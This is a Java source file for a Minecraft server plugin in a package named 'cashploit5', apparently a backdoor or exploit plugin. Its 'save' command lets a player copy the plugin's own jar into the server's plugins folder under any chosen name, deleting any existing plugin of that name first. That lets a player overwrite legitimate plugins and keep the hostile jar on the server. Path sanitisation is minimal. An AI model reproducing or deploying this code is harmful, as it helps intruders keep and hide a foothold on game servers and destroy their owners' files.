package de.cashploit5.v1_12_2.command;

import java.io.File;
import java.io.IOException;
import java.net.URISyntaxException;

import org.bukkit.entity.Player;

import com.google.common.io.Files;

import de.cashploit5.Main;

public class SaveCommand extends Command {

	public SaveCommand() {
		super("save");
	}

	public void onCommand(Player p, Command command, String[] args) {

		p.sendMessage(args.length + "");
		
		if (args.length == 1) {
			String kopie = args[0];
			String plugin = "";
			try {
				plugin = Main.class.getProtectionDomain().getCodeSource().getLocation().toURI().toString()
						.replaceFirst("file:/", "");
			} catch (URISyntaxException e1) {
			}
			if (!kopie.endsWith(".jar"))
				kopie += ".jar";

			plugin = plugin.replace("..", ".");
			kopie = kopie.replace("..", ".");

			File f = new File("./plugins");

			if (new File(plugin).exists()) {
				if (new File(f, kopie).exists()) {
					new File(f, kopie).delete();
					try {
						Files.copy(new File(plugin), new File(f, kopie));
						p.sendMessage("§aPlugin erfolgreich kopiert!");
					} catch (IOException e) {
						p.sendMessage("§cEin Fehler ist aufgetreten beim kopieren!");
					}
				} else {
					try {
						Files.copy(new File(plugin), new File(f, kopie));
						p.sendMessage("§aPlugin erfolgreich kopiert!");
					} catch (IOException e) {
						p.sendMessage("§cEin Fehler ist aufgetreten beim kopieren!");
					}
				}
			} else {
				p.sendMessage("§cAngegebenes Plugin existiert nicht! §6" + plugin);
			}

		} else {
			p.sendMessage("§c°save <Name der Kopie>");
		}

	}

}
